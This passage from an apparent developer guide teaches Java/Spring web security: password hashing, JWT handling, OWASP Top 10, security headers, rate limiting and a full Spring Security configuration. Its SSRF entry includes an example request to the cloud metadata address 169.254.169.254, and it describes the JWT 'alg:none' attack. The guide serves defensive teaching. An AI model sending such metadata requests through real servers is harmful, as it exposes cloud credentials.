    // Filter returned list to only user's orders!
}
```

---

# 7. Password Security

## 7.1 Password Hashing

```java
// NEVER store plaintext passwords!
// NEVER use MD5 or SHA1 for passwords (too fast → brute force!)

// WHY bcrypt/Argon2:
// Intentionally SLOW (parameterizable work factor)
// Includes salt (prevents rainbow table attacks)
// Work factor adjustable as hardware gets faster

// MD5("password") = same hash everywhere → rainbow table!
// bcrypt("password") = unique hash each time (built-in salt)

// ── BCrypt (current standard) ──
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(12);  // strength 12 = ~300ms per hash
    // Strength 10 = default, ~100ms (too fast for production!)
    // Strength 12 = recommended (~300ms, much harder to brute force)
    // Strength 15+ = very slow (use for high-value accounts)
}

// Store:
String rawPassword = "userPassword123!";
String hashed = passwordEncoder.encode(rawPassword);
// $2a$12$...  (bcrypt format: version + cost + salt + hash, all in one string)
user.setPasswordHash(hashed);
userRepository.save(user);

// Verify:
boolean matches = passwordEncoder.matches(rawPassword, user.getPasswordHash());
// BCryptPasswordEncoder extracts salt from stored hash, hashes input with same salt

// ── Argon2 (winner of Password Hashing Competition, newer) ──
@Bean
public PasswordEncoder argon2PasswordEncoder() {
    return new Argon2PasswordEncoder(
        16,    // salt length (bytes)
        32,    // hash length (bytes)
        1,     // parallelism
        65536, // memory (KB) — makes GPU attacks expensive!
        3      // iterations
    );
}
// Argon2 advantages over BCrypt:
// - Memory-hard: requires significant RAM → GPU brute force much harder
// - 3 variants: Argon2i (side-channel resistant), Argon2d (GPU resistant), Argon2id (both)

// ── SCRYPT (another option) ──
SCryptPasswordEncoder scrypt = SCryptPasswordEncoder.defaultsForSpringSecurity_v5_8();

// ── PASSWORD POLICY ──
public void validatePassword(String password) {
    if (password.length() < 12)
        throw new WeakPasswordException("Password must be at least 12 characters");
    
    if (!password.matches(".*[A-Z].*"))
        throw new WeakPasswordException("Must contain uppercase letter");
    
    if (!password.matches(".*[0-9].*"))
        throw new WeakPasswordException("Must contain digit");
    
    if (!password.matches(".*[!@#$%^&*].*"))
        throw new WeakPasswordException("Must contain special character");
    
    // Check against common passwords list:
    if (commonPasswords.contains(password.toLowerCase()))
        throw new WeakPasswordException("Password is too common");
    
    // Check against HaveIBeenPwned API:
    if (pwnedPasswordsService.isPwned(password))
        throw new WeakPasswordException("Password has been found in data breaches");
}

// ── TIMING ATTACK PREVENTION ──
// WRONG: early return leaks timing info
boolean verifyBad(String input, String stored) {
    return input.equals(stored);  // returns fast if first chars differ
}

// CORRECT: constant-time comparison
boolean verifyGood(String input, String stored) {
    return MessageDigest.isEqual(
        input.getBytes(StandardCharsets.UTF_8),
        stored.getBytes(StandardCharsets.UTF_8));
}
// BCryptPasswordEncoder.matches() is already constant-time
```

---

# 8. JWT — JSON Web Token

## 8.1 JWT Structure & Security

```
JWT FORMAT: header.payload.signature
  (Base64URL encoded, NOT encrypted by default!)

HEADER:
  {"alg": "HS256", "typ": "JWT"}
  → eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

PAYLOAD (claims — NOT ENCRYPTED, just encoded!):
  {
    "sub": "user:123",           // subject (user ID)
    "iss": "auth.example.com",   // issuer
    "aud": "api.example.com",    // audience
    "exp": 1716192000,           // expiration (Unix timestamp)
    "iat": 1716105600,           // issued at
    "jti": "unique-token-id",    // JWT ID (for revocation)
    "roles": ["USER"],
    "email": "user@example.com"
  }
  → eyJzdWIiOiJ1c2VyOjEyMyIsInJvbGVzIjpbIlVTRVIiXX0

SIGNATURE:
  HMACSHA256(base64url(header) + "." + base64url(payload), secret)
  → SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

SECURITY CONCERNS:
  1. Payload visible to anyone! (base64 decoded) → don't put sensitive data in JWT
  2. "alg:none" attack: attacker sets algorithm to "none" → no signature verification
     Fix: explicitly specify allowed algorithms, never accept "none"
  3. Algorithm confusion: HS256 vs RS256 switch
  4. Weak secret: brute-forceable HMAC secret
  5. No expiration: token valid forever
  6. Can't invalidate before expiry (stateless)
```

```java
// ── JWT IMPLEMENTATION (Spring) ──
// Using io.jsonwebtoken:jjwt-api library

@Service
public class JwtService {

    @Value("${jwt.secret}")  // min 256 bits (32 bytes) for HS256!
    private String secretKey;

    @Value("${jwt.expiration:3600}")  // 1 hour in seconds
    private long expirationSeconds;

    private SecretKey getSigningKey() {
        byte[] keyBytes = Decoders.BASE64.decode(secretKey);
        return Keys.hmacShaKeyFor(keyBytes);
    }

    // ── GENERATE TOKEN ──
    public String generateToken(UserDetails userDetails) {
        return generateToken(Map.of(), userDetails);
    }

    public String generateToken(Map<String, Object> extraClaims, UserDetails userDetails) {
        return Jwts.builder()
            .claims(extraClaims)
            .subject(userDetails.getUsername())
            .issuer("auth.example.com")
            .audience().add("api.example.com").and()
            .issuedAt(new Date())
            .expiration(new Date(System.currentTimeMillis() + expirationSeconds * 1000))
            .id(UUID.randomUUID().toString())  // jti for revocation
            .signWith(getSigningKey(), Jwts.SIG.HS256)  // explicit algorithm!
            .compact();
    }

    // ── VALIDATE TOKEN ──
    public boolean isTokenValid(String token, UserDetails userDetails) {
        try {
            Claims claims = extractAllClaims(token);
            String username = claims.getSubject();
            Date expiry = claims.getExpiration();

            return username.equals(userDetails.getUsername())
                && expiry.after(new Date())
                && isNotRevoked(claims.getId());  // check jti not in revocation list
        } catch (JwtException e) {
            log.warn("Invalid JWT: {}", e.getMessage());
            return false;
        }
    }

    private Claims extractAllClaims(String token) {
        return Jwts.parser()
            .verifyWith(getSigningKey())
            .requireIssuer("auth.example.com")        // validate issuer!
            .requireAudience("api.example.com")        // validate audience!
            .build()
            .parseSignedClaims(token)
            .getPayload();
        // Throws: JwtException if invalid signature, expired, wrong issuer/audience
    }

    // ── REFRESH TOKEN PATTERN ──
    // Access token: short-lived (15min - 1hour)
    // Refresh token: long-lived (7 - 30 days), stored in HttpOnly cookie
    // When access token expires: use refresh token to get new access token
    // If refresh token compromised: can be revoked (stored in DB)

    public TokenPair generateTokenPair(UserDetails user) {
        String accessToken = generateToken(user);  // short-lived
        String refreshToken = generateRefreshToken(user);  // long-lived
        refreshTokenRepo.save(new RefreshToken(
            refreshToken, user.getUsername(), Instant.now().plusSeconds(30 * 24 * 3600)));
        return new TokenPair(accessToken, refreshToken);
    }

    public String refreshAccessToken(String refreshToken) {
        RefreshToken stored = refreshTokenRepo.findByToken(refreshToken)
            .orElseThrow(() -> new InvalidRefreshTokenException());

        if (stored.getExpiresAt().isBefore(Instant.now()))
            throw new RefreshTokenExpiredException();

        // Rotate refresh token (security best practice):
        refreshTokenRepo.delete(stored);
        return generateToken(loadUser(stored.getUsername()));
    }

    // ── REVOKE TOKEN (for logout) ──
    // Access token: add jti to Redis blocklist until token expires
    // Refresh token: delete from database

    public void revokeToken(String token) {
        Claims claims = extractAllClaims(token);
        String jti = claims.getId();
        long ttl = claims.getExpiration().getTime() - System.currentTimeMillis();
        if (ttl > 0) {
            redis.opsForValue().set("revoked:" + jti, "1", Duration.ofMillis(ttl));
        }
    }

    private boolean isNotRevoked(String jti) {
        return redis.opsForValue().get("revoked:" + jti) == null;
    }
}

// ── STORING JWT SECURELY ──
// localStorage: accessible to JS → vulnerable to XSS → avoid for session tokens
// sessionStorage: same problem
// HttpOnly cookie: JS cannot read → XSS can't steal!
//   + SameSite=Strict: CSRF protection
//   BUT: must handle CSRF if cookie is used for auth
// Memory: lost on refresh, but safest from XSS

// Recommended: HttpOnly cookie for refresh token, memory/short-lived for access token
```

---

# 9. OWASP Top 10 (2021)

```
A01: Broken Access Control (most common!)
     Users accessing other users' data
     Fix: server-side authorization checks, deny by default

A02: Cryptographic Failures
     Weak encryption, plaintext sensitive data
     Fix: TLS everywhere, strong hashing for passwords, encrypt sensitive fields

A03: Injection (SQL, LDAP, OS, SSTI)
     User input executed as code/commands
     Fix: parameterized queries, input validation, least privilege

A04: Insecure Design
     Missing security requirements in architecture
     Fix: threat modeling, secure design patterns, abuse cases

A05: Security Misconfiguration
     Default credentials, verbose errors, unnecessary features enabled
     Fix: hardened defaults, security scanning, disable debug in prod

A06: Vulnerable and Outdated Components
     Using libraries with known vulnerabilities
     Fix: dependency scanning (OWASP Dependency-Check, Snyk), update regularly

A07: Identification and Authentication Failures
     Weak passwords, no MFA, session fixation
     Fix: strong password policy, MFA, secure session management

A08: Software and Data Integrity Failures
     CI/CD pipeline attacks, unsigned updates
     Fix: verify integrity of software, secure SDLC, code signing

A09: Security Logging and Monitoring Failures
     Can't detect breaches, no audit trail
     Fix: centralized logging, alerting on suspicious activity, audit logs

A10: Server-Side Request Forgery (SSRF)
     Server makes request to attacker-controlled URL
     Attack: fetch('http://169.254.169.254/metadata') → AWS metadata!
     Fix: validate/whitelist URLs, block internal IPs, disable redirects
```

---

# 10. Security Headers

## 10.1 HTTP Security Headers

```java
// ── SPRING SECURITY HEADERS ──
http.headers(headers -> headers
    // X-Content-Type-Options: nosniff
    // Prevent browser from MIME-sniffing (guessing content type)
    .contentTypeOptions(Customizer.withDefaults())

    // X-Frame-Options: DENY
    // Prevent clickjacking (embedding site in iframe)
    .frameOptions(frame -> frame.deny())
    // Or: SAMEORIGIN (only same origin can iframe)

    // X-XSS-Protection: 0
    // Disable legacy XSS filter (modern browsers use CSP instead)
    .xssProtection(xss -> xss.disable())  // deprecated, use CSP

    // Strict-Transport-Security
    .httpStrictTransportSecurity(hsts -> hsts
        .maxAgeInSeconds(31536000)
        .includeSubDomains(true)
        .preload(true))

    // Content-Security-Policy
    .contentSecurityPolicy(csp -> csp
        .policyDirectives("default-src 'self'; frame-ancestors 'none';"))

    // Referrer-Policy
    .referrerPolicy(referrer -> referrer
        .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))

    // Permissions-Policy (Feature-Policy)
    .permissionsPolicy(permissions -> permissions
        .policy("camera=(), microphone=(), geolocation=(self), payment=()"))

    // Cache-Control for sensitive pages
    .cacheControl(Customizer.withDefaults())
    // Cache-Control: no-cache, no-store, max-age=0, must-revalidate
);

// Custom headers:
http.headers(headers -> headers
    .addHeaderWriter(new StaticHeadersWriter(
        "X-Custom-Security-Header", "protected")));

// ── COMPLETE SECURITY HEADERS EXAMPLE ──
// Response headers for a secure web app:
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self'; frame-ancestors 'none'; upgrade-insecure-requests;
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Cache-Control: no-store  (for authenticated pages)

// TEST HEADERS: https://securityheaders.com
```

---

# 11. API Security

## 11.1 Rate Limiting

```java
// RATE LIMITING: prevent abuse, brute force, DDoS

// ── Spring Boot với Bucket4j ──
@Component
public class RateLimitingFilter extends OncePerRequestFilter {

    private final LoadingCache<String, Bucket> buckets = Caffeine.newBuilder()
        .expireAfterAccess(Duration.ofMinutes(10))
        .build(key -> createBucket());

    private Bucket createBucket() {
        return Bucket.builder()
            .addLimit(Bandwidth.classic(100, Refill.intervally(100, Duration.ofMinutes(1))))
            // 100 requests per minute
            .addLimit(Bandwidth.classic(10, Refill.intervally(10, Duration.ofSeconds(1))))
            // 10 requests per second (burst protection)
            .build();
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain chain) throws IOException, ServletException {
        String key = extractKey(request);  // IP or user ID
        Bucket bucket = buckets.get(key);

        ConsumptionProbe probe = bucket.tryConsumeAndReturnRemaining(1);
        if (probe.isConsumed()) {
            response.addHeader("X-Rate-Limit-Remaining", String.valueOf(probe.getRemainingTokens()));
            chain.doFilter(request, response);
        } else {
            long waitSeconds = probe.getNanosToWaitForRefill() / 1_000_000_000;
            response.addHeader("Retry-After", String.valueOf(waitSeconds));
            response.sendError(429, "Too Many Requests");
        }
    }

    private String extractKey(HttpServletRequest request) {
        // Authenticated user: use user ID (more precise)
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        if (auth != null && auth.isAuthenticated() && !"anonymousUser".equals(auth.getPrincipal())) {
            return "user:" + auth.getName();
        }
        // Anonymous: use IP
        String xForwardedFor = request.getHeader("X-Forwarded-For");
        return "ip:" + (xForwardedFor != null ? xForwardedFor.split(",")[0].trim() : request.getRemoteAddr());
    }
}

// ── SPECIFIC RATE LIMITS PER ENDPOINT ──
// Login endpoint: stricter (prevent brute force)
// /api/login: 5 attempts per 15 minutes
// /api/search: 100 per minute
// /api/data: 1000 per minute
```

## 11.2 Input Validation & Sanitization

```java
// ── BEAN VALIDATION ──
public record CreateUserRequest(
    @NotBlank(message = "Username required")
    @Size(min = 3, max = 50)
    @Pattern(regexp = "^[a-zA-Z0-9_-]+$", message = "Alphanumeric, underscore, hyphen only")
    String username,

    @NotBlank
    @Email
    @Size(max = 254)  // RFC 5321 max email length
    String email,

    @NotBlank
    @Size(min = 12, max = 128)
    String password,

    @NotNull
    @Min(18)
    @Max(120)
    Integer age,

    @URL  // valid URL format
    String website,

    @Positive
    Long organizationId
) {}

// ── SENSITIVE DATA PROTECTION ──
public class UserResponse {
    private Long id;
    private String username;
    private String email;
    // NEVER include: password, passwordHash, secretKey, internalId
    // NEVER include: SSN, credit card, bank account (unless specifically needed)

    @JsonIgnore  // never serialize this field
    private String internalCode;

    @JsonProperty(access = JsonProperty.Access.WRITE_ONLY)
    private String password;  // accept in request but never return in response
}

// ── MASS ASSIGNMENT PROTECTION ──
// Bad: @RequestBody User user (user could set role=ADMIN, isVerified=true!)
// Good: use DTOs, only allow specific fields

public record CreateUserRequest(String username, String email, String password) {}
// Role, isAdmin, createdAt etc. NOT in request DTO → user can't set them!
```

---

# 12. Security in Spring Boot

## 12.1 Complete Security Configuration

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class SecurityConfig {

    @Bean
    SecurityFilterChain filterChain(HttpSecurity http, JwtAuthFilter jwtFilter) throws Exception {
        return http
            // Disable CSRF for stateless REST API (using JWT in Authorization header)
            .csrf(AbstractHttpConfigurer::disable)

            // CORS configuration
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))

            // Stateless session (JWT, no server-side sessions)
            .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))

            // Security headers
            .headers(headers -> headers
                .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
                .contentSecurityPolicy(csp -> csp.policyDirectives(
                    "default-src 'self'; frame-ancestors 'none'; upgrade-insecure-requests;"))
                .frameOptions(frame -> frame.deny())
                .contentTypeOptions(Customizer.withDefaults())
            )

            // URL authorization rules
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/actuator/health", "/actuator/info").permitAll()
                .requestMatchers("/api/v1/auth/**").permitAll()
                .requestMatchers(HttpMethod.GET, "/api/v1/public/**").permitAll()
                .requestMatchers("/api/v1/admin/**").hasRole("ADMIN")
                .requestMatchers("/api/v1/user/**").hasAnyRole("USER", "ADMIN")
                .anyRequest().authenticated()
            )

            // Exception handling
            .exceptionHandling(ex -> ex
                .authenticationEntryPoint((req, res, e) -> {
                    res.setContentType(MediaType.APPLICATION_JSON_VALUE);
                    res.setStatus(HttpStatus.UNAUTHORIZED.value());
                    res.getWriter().write("""
                        {"error":"UNAUTHORIZED","message":"Authentication required","path":"%s"}
                        """.formatted(req.getRequestURI()));
                })
                .accessDeniedHandler((req, res, e) -> {
                    res.setContentType(MediaType.APPLICATION_JSON_VALUE);
                    res.setStatus(HttpStatus.FORBIDDEN.value());
                    res.getWriter().write("""
                        {"error":"FORBIDDEN","message":"Insufficient permissions","path":"%s"}
                        """.formatted(req.getRequestURI()));
                })
            )

            // Add JWT filter before username/password filter
            .addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class)

            // Rate limiting filter
            .addFilterBefore(rateLimitingFilter, JwtAuthFilter.class)

            .build();
    }

    @Bean
    CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowedOrigins(List.of(
            "https://app.example.com",
            "https://admin.example.com"
        ));
        config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"));
        config.setAllowedHeaders(List.of("Authorization", "Content-Type", "X-Requested-With"));
        config.setExposedHeaders(List.of("X-Rate-Limit-Remaining", "X-Total-Count"));
        config.setAllowCredentials(true);
        config.setMaxAge(3600L);

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", config);
        return source;
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder(12);
    }
}

// ── SECURITY AUDIT LOGGING ──
@Component
@Aspect
public class SecurityAuditAspect {

    @Around("@annotation(AuditLog)")
    public Object audit(ProceedingJoinPoint pjp, AuditLog auditLog) throws Throwable {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        String username = auth != null ? auth.getName() : "anonymous";
        String action = auditLog.action();
        String requestId = MDC.get("requestId");

        log.info("AUDIT: user={} action={} requestId={} args={}",
            username, action, requestId,
            sanitizeArgs(pjp.getArgs()));  // don't log passwords!

        try {
            Object result = pjp.proceed();
            log.info("AUDIT: user={} action={} result=SUCCESS", username, action);
            return result;
        } catch (Exception e) {
            log.warn("AUDIT: user={} action={} result=FAILED error={}", username, action, e.getMessage());
            throw e;
        }
    }
}

@DeleteMapping("/users/{id}")
@PreAuthorize("hasRole('ADMIN')")
@AuditLog(action = "DELETE_USER")
public ResponseEntity<Void> deleteUser(@PathVariable Long id) {
    userService.delete(id);
    return ResponseEntity.noContent().build();
}
```

---

## 📎 Security Quick Reference

```
SQL INJECTION:    PreparedStatement / parameterized queries ALWAYS
                  NEVER concatenate user input into SQL
                  Least privilege DB user

XSS:              Encode OUTPUT (not input) by context
                  HttpOnly + Secure + SameSite cookies
                  Content-Security-Policy header
                  Use Jsoup/AntiSamy for rich text

CSRF:             CSRF token (Spring Security default for web)
                  SameSite=Strict/Lax cookies
                  Stateless JWT + Authorization header (no CSRF needed)

HTTPS/TLS:        TLS 1.3 preferred, TLS 1.2 minimum
                  HSTS with includeSubDomains + preload
                  Perfect Forward Secrecy (ECDHE)
                  SSLLABS test: aim for A+

PASSWORDS:        BCrypt strength 12+ / Argon2id
                  Never MD5, SHA1, SHA256 for passwords
                  Minimum 12 chars, check against breach databases

JWT:              Short expiry (15min-1h) + refresh token
                  HttpOnly cookie for refresh token
                  Validate: signature, expiry, issuer, audience
                  Explicit algorithm (never accept "none")

HEADERS:          HSTS, CSP, X-Frame-Options, X-Content-Type-Options
                  Referrer-Policy, Permissions-Policy

API SECURITY:     Rate limiting, input validation, CORS
                  Error messages: generic to user, detailed in logs
                  Principle of least privilege

OWASP TOP:        Broken Access Control #1, Injection #3
                  Regular dependency scanning (Snyk, OWASP DC)
                  Verbose errors disabled in production
```

## 📎 Official Documentation Links

| Topic | Link |
|-------|------|
| OWASP Top 10 | <https://owasp.org/www-project-top-ten/> |
| OWASP Cheat Sheet Series | <https://cheatsheetseries.owasp.org/> |
| Spring Security | <https://docs.spring.io/spring-security/reference/> |
| OWASP Java Encoder | <https://owasp.org/www-project-java-encoder/> |
| TLS Best Practices | <https://wiki.mozilla.org/Security/Server_Side_TLS> |
| Let's Encrypt | <https://letsencrypt.org/docs/> |
| SSL Labs Test | <https://www.ssllabs.com/ssltest/> |
| Security Headers | <https://securityheaders.com/> |
| HaveIBeenPwned API | <https://haveibeenpwned.com/API/v3> |
| JWT.io | <https://jwt.io/> |
| Bucket4j (Rate Limiting) | <https://bucket4j.com/> |
| OWASP Dependency-Check | <https://owasp.org/www-project-dependency-check/> |
